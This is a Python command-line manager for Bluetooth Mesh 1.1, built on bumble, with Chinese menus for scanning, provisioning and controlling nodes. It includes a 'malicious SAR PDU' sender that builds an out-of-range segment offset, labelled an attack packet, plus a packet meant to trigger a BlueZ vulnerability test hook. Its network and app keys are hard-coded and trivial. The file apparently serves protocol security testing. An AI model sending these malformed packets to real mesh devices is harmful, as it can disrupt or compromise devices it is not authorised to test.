import asyncio
import logging
import sys
from typing import Dict, List
from bumble.device import Device
from bumble.transport import open_transport
from bumble_mesh.stack import MeshStack
from bumble_mesh.logger import setup_logging

# 初始化全局日志配置
setup_logging()

logger = logging.getLogger('mesh_manager')

class MeshManager:
    def __init__(self, stack: MeshStack):
        self.stack = stack
        self.scanned_devices: Dict[str, dict] = {} # uuid_hex -> info
        self.target_addr = None
        self.app_key = b'\x02' * 16
        self.app_key_index = 0

        # 注册回调
        self.stack.bearer.on_unprovisioned_device = self._on_device_found
        self.stack.on_auth_needed = self._on_auth_prompt

    def _on_device_found(self, uuid, rssi, oob_info):
        uuid_hex = uuid.hex()
        if uuid_hex not in self.scanned_devices:
            self.scanned_devices[uuid_hex] = {'uuid': uuid, 'rssi': rssi}
            # 这里的打印不会干扰输入，因为我们会手动刷新菜单
    
    async def _on_auth_prompt(self, uuid, method):
        print(f"\n[认证] 设备 {uuid.hex()} 请求认证！")
        pin = await asyncio.to_thread(input, "请输入设备显示的 PIN 码: ")
        try:
            await self.stack.resume_provisioning_with_pin(uuid, int(pin))
        except ValueError:
            print("错误: PIN 码必须是数字")

    async def show_menu(self):
        while True:
            print("\n" + "="*45)
            print("   Bluetooth Mesh 1.1 管理终端 (顺序引导模式)")
            print("="*45)
            print(f" [当前操作目标]: {f'0x{self.target_addr:04x}' if self.target_addr else '--- 未设置 ---'}")
            print("-" * 45)
            print(" --- 第一步：新设备入网 (Onboarding) ---")
            print("  1. 扫描未配网设备 (Local Scan)")
            print("  2. 执行本地配网 (Local Provision)")
            
            print("\n --- 第二步：锁定与控制 (Control) ---")
            print("  3. 查看已配网节点列表 (Nodes List)")
            print("  4. 锁定操作目标地址 (Set Target)")
            print("  5. 获取设备功能列表 (Composition Get)")
            print("  6. 控制指令: 开灯 (ON)")
            print("  7. 控制指令: 关灯 (OFF)")
            print("  8. 查询实时状态 (Get Status)")

            print("\n --- 第三步：远程扩展与维护 (Advanced) ---")
            print("  9. 远程扫描 (通过当前目标节点进行)")
            print("  10. 远程配网 (通过当前目标节点进行)")
            print("  11. 手动触发配置 (Manual Re-Config Target)")
            print("  12. 发送自定义 SAR PDU (Custom SAR PDU)")
            print("  13. 发送错误自定义 SAR PDU (Malicious SAR PDU)")
            print("  14. 触发测试钩子 (Trigger Test Hook)")
            
            print("\n --- 其他 ---")
            print("  15. 退出 (Quit)")
            print("-" * 45)
            
            choice = await asyncio.to_thread(input, "请选择操作 [1-15]: ")
            
            if choice == '1':
                await self.scan_flow()
            elif choice == '2':
                await self.provision_flow()
            elif choice == '3':
                self.list_nodes()
            elif choice == '4':
                await self.target_flow()
            elif choice == '5':
                await self.composition_get_flow()
            elif choice == '6':
                await self.control_onoff(True)
            elif choice == '7':
                await self.control_onoff(False)
            elif choice == '8':
                await self.get_status()
            elif choice == '9':
                await self.remote_scan_flow()
            elif choice == '10':
                await self.remote_provision_flow()
            elif choice == '11':
                await self.manual_config_flow()
            elif choice == '12':
                await self.send_custom_sar_pdu(seg_n=1, seg_o=0)
            elif choice == '13':
                await self.send_custom_sar_pdu(seg_n=1, seg_o=31, is_malicious=True)
            elif choice == '14':
                await self.trigger_test_hook()
            elif choice == '15':
                break
            else:
                print("无效选择")
                
    async def trigger_test_hook(self):
        """
        发送一个以 0xff 开头的数据包，触发 BlueZ 的 VULNERABILITY TEST HOOK。
        """
        if not self.target_addr:
            print("[-] 错误: 请先设置目标地址")
            return

        print(f"[*] 正在尝试向 {self.target_addr:04x} 触发测试钩子...")

        # 构造 Payload：第一个字节必须是 0xff
        access_pdu = b'\xff' + b'A' * 15

        # 使用 DevKey 加密，模拟管理指令
        key = self.stack.upper_transport.get_dev_key(self.target_addr) or b'\x00'*16
        encrypted_pdu = self.stack.upper_transport.encrypt(
            self.stack.unicast_address, self.target_addr,
            self.stack.network.seq, self.stack.network.iv_index,
            access_pdu, key, akf=0, aid=0
        )

        network_pdu = self.stack.network.encrypt_pdu(
            self.stack.unicast_address, self.target_addr, encrypted_pdu
        )

        await self.stack.bearer.send_pdu(network_pdu, is_pb_adv=False)
        print("[+] 钩子触发包已发出。请检查 BlueZ 日志是否包含 'TRIGGERING VULNERABILITY TEST HOOK'")       
               
    async def send_custom_sar_pdu(self, seg_n: int, seg_o: int, is_malicious: bool = False):                                        
        """                                                                                                                         
        手动构造并发送一个分段报文。                                                                                                
        seg_n: 总分段数 - 1 (5 bits)                                                                                                
        seg_o: 当前分段索引 (5 bits)                                                                                                
        """                                                                                                                         
        if not self.target_addr:                                                                                                    
            print("[-] 错误: 请先设置目标地址")                                                                                     
            return                                                                                                                  
                                                                                                                                    
        # 1. 准备应用层数据 (使用 Generic OnOff Set 保证逻辑合法)                                                                   
        opcode = 0x8202                                                                                                             
        payload = b'\x01\x00' + b'\x00' * 10                                                                                        
        access_pdu = self.stack._create_access_pdu(opcode, payload)                                                                 
                                                                                                                                    
        # 2. 加密 PDU                                                                                                               
        key = self.app_key                                                                                                          
        seq = self.stack.network.seq                                                                                                
        iv_index = self.stack.network.iv_index                                                                                      
                                                                                                                                    
        # AID 0x37 对应你的 AppKey 0x02...02                                                                                        
        encrypted_pdu = self.stack.upper_transport.encrypt(                                                                         
            self.stack.unicast_address, self.target_addr,                                                                           
            seq, iv_index, access_pdu, key, akf=1, aid=0x37                                                                         
        )                                                                                                                           
                                                                                                                                    
        # 3. 构造分段传输层头部 (Lower Transport Header)                                                                            
        chunk = encrypted_pdu[:12]                                                                                                  
        seq_zero = seq & 0x1FFF                                                                                                     
                                                                                                                                    
        # 组装 4 字节头部                                                                                                           
        h0 = 0x80 | (1 << 6) | 0x37   # SEG=1, AKF=1, AID=0x37                                                                      
        h1 = (0 << 7) | ((seq_zero >> 6) & 0x7F)                                                                                    
        h2 = ((seq_zero & 0x3F) << 2) | ((seg_o >> 3) & 0x03)                                                                       
        h3 = ((seg_o & 0x07) << 5) | (seg_n & 0x1F)                                                                                 
                                                                                                                                    
        transport_pdu = bytes([h0, h1, h2, h3]) + chunk                                                                             
                                                                                                                                    
        # 4. 发送                                                                                                                   
        print(f"[*] 正在发送分段包: seqAuth={seq}, segO={seg_o}, segN={seg_n} " + ("(!!! 攻击包 !!!)" if is_malicious else "(正常包)"))                                                                                                                        
        network_pdu = self.stack.network.encrypt_pdu(                                                                               
            self.stack.unicast_address, self.target_addr, transport_pdu                                                             
        )                                                                                                                           
                                                                                                                                    
        await self.stack.bearer.send_pdu(network_pdu, is_pb_adv=False)                                                                               
        self.stack.storage.set_setting("seq", self.stack.network.seq) # 同步 SEQ 到数据库                                           
        print(f"[+] 报文已发出，SEQ={seq}")    

    async def manual_config_flow(self):
        if not self.target_addr:
            print("错误: 请先设置目标地址")
            return
        print(f"正在为 {self.target_addr:04x} 重新执行配置流...")
        await self.stack.config_manager.configure_node(self.target_addr, 0, self.app_key)

    async def composition_get_flow(self):
        if not self.target_addr:
            print("错误: 请先设置目标地址")
            return
        print(f"\n正在获取节点 {self.target_addr:04x} 的 Composition Data...")
        comp_event = asyncio.Event()
        def on_comp(src, page, data):
            if src == self.target_addr:
                print(f"\n[Composition] 收到 Page {page}, {len(data)} 字节")
                comp_event.set()
        self.stack.config_client.on_composition_data = on_comp
        opcode, payload = self.stack.config_client.composition_data_get()
        await self.stack.send_model_message(self.target_addr, self.stack.config_client, opcode, payload)
        try:
            await asyncio.wait_for(comp_event.wait(), timeout=5.0)
            print(f"[Composition] 节点 {self.target_addr:04x} 的模型信息已存入数据库。")
            # Show stored models
            models = self.stack.storage.get_node_models(self.target_addr)
            if models:
                print("  已记录的模型:")
                for m in models:
                    vendor_tag = " (Vendor)" if m.get('is_vendor') else ""
                    print(f"    Element {m['elem_addr']:04x} | Model 0x{m['model_id']:04x}{vendor_tag}")
            else:
                print("  (无模型记录)")
        except asyncio.TimeoutError:
            print("[Composition] 超时: 设备未响应 (5秒)。请检查:")
            print("  1. 设备是否已完成配网并切换到 Mesh 网络模式")
            print("  2. 目标地址是否正确")
            print("  3. DevKey 是否匹配")

    async def remote_scan_flow(self):
        if not self.target_addr:
            print("错误: 请先设置目标地址（充当中继的节点）")
            return
        
        self.scanned_devices.clear()
        print(f"\n指令已下发，正在通过 {self.target_addr:04x} 进行远程扫描...")
        
        def on_remote_report(src, uuid, rssi, oob):
            uid_hex = uuid.hex()
            if uid_hex not in self.scanned_devices:
                self.scanned_devices[uid_hex] = {'uuid': uuid, 'rssi': rssi}
                print(f" [发现远端设备] UUID: {uid_hex} | RSSI: {rssi}dBm")

        self.stack.rp_client.on_scan_report = on_remote_report
        opcode, payload = self.stack.rp_client.scan_start(timeout=10)
        await self.stack.send_model_message(self.target_addr, self.stack.rp_client, opcode, payload)
        
        print("\n[!] 远程扫描持续 10 秒...")
        
        await asyncio.sleep(10.0)
        print("\n远程扫描结束。")

    async def remote_provision_flow(self):
        if not self.target_addr:
            print("错误: 请先设置目标地址（中继节点）")
            return
        if not self.scanned_devices:
            print("错误: 请先执行远程扫描")
            return

        idx_str = await asyncio.to_thread(input, "选择要配网的远端设备编号: ")
        try:
            idx = int(idx_str)
            uuid_hex = list(self.scanned_devices.keys())[idx]
            uuid_bytes = self.scanned_devices[uuid_hex]['uuid']
            
            print(f"\n正在通过 {self.target_addr:04x} 启动远程配网: {uuid_hex}...")
            await self.stack.remote_provision_device(self.target_addr, uuid_bytes)
            print("\n[提示] 远程配网已结束，请检查 Nodes 列表。")
        except (ValueError, IndexError, Exception) as e:
            print(f"操作失败: {e}")

    async def scan_flow(self):
        self.scanned_devices.clear()
        print("\n正在扫描未配网设备 (持续 5 秒)...")
        await asyncio.sleep(5.0)
        if not self.scanned_devices:
            print("未发现新设备。")
        else:
            print("\n发现以下设备:")
            for i, (uid, info) in enumerate(self.scanned_devices.items()):
                print(f" [{i}] UUID: {uid} | RSSI: {info['rssi']}dBm")

    async def provision_flow(self):
        if not self.scanned_devices:
            print("错误: 请先执行扫描")
            return
        
        idx_str = await asyncio.to_thread(input, "选择要配网的设备编号: ")
        try:
            idx = int(idx_str)
            uuid_hex = list(self.scanned_devices.keys())[idx]
            device_info = self.scanned_devices[uuid_hex]
            
            print(f"\n正在启动配网: {uuid_hex}...")
            # 这个函数会触发认证回调，并自动触发后续的配置流
            await self.stack.provision_device(device_info['uuid'])
            print("\n[提示] 配网已触发。如果是 OOB 模式，请注意 PIN 码输入提示。")
            print("[提示] 流程结束后，请查看 'Nodes' 列表。")
        except (ValueError, IndexError):
            print("无效的编号")

    def list_nodes(self):
        nodes = self.stack.storage.get_nodes()
        print("\n已记录的节点列表:")
        if not nodes:
            print(" (空)")
        for n in nodes:
            print(f"  地址: {n['address']:04x} | UUID: {n['uuid'].hex()} | 名称: {n['name']}")

    async def target_flow(self):
        addr_str = await asyncio.to_thread(input, "输入目标节点的 4 位十六进制地址 (如 0002): ")
        try:
            self.target_addr = int(addr_str, 16)
            print(f"目标已设为: {self.target_addr:04x}")
        except ValueError:
            print("无效的地址格式")

    async def control_onoff(self, state: bool):
        if not self.target_addr:
            print("错误: 请先设置目标地址")
            return
        opcode, payload = self.stack.onoff_client.set(state, tid=getattr(self, '_tid', 0))
        self._tid = (getattr(self, '_tid', 0) + 1) % 256
        await self.stack.send_model_message(self.target_addr, self.stack.onoff_client, opcode, payload, app_key=self.app_key)
        print(f"指令已发送: {'ON' if state else 'OFF'}")

    async def get_status(self):
        if not self.target_addr:
            print("错误: 请先设置目标地址")
            return
        opcode, payload = self.stack.onoff_client.get()
        await self.stack.send_model_message(self.target_addr, self.stack.onoff_client, opcode, payload, app_key=self.app_key)
        print("状态查询已发送，等待回复...")

async def main():
    # 自动识别 HCI 端口
    transport_path = sys.argv[1] if len(sys.argv) > 1 else 'hci-socket:1'
    
    async with await open_transport(transport_path) as (hci_source, hci_sink):
        device = Device.with_hci('Mesh-Manager', '00:00:00:00:00:00', hci_source, hci_sink)
        await device.power_on()
        
        # 初始化
        net_key = b'\x00' * 16
        stack = MeshStack(device, net_key, 0x0001)
        await stack.start()
        
        # 确保本地 AppKey 加载
        stack.upper_transport.add_app_key(0, b'\x02' * 16)

        manager = MeshManager(stack)
        await manager.show_menu()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
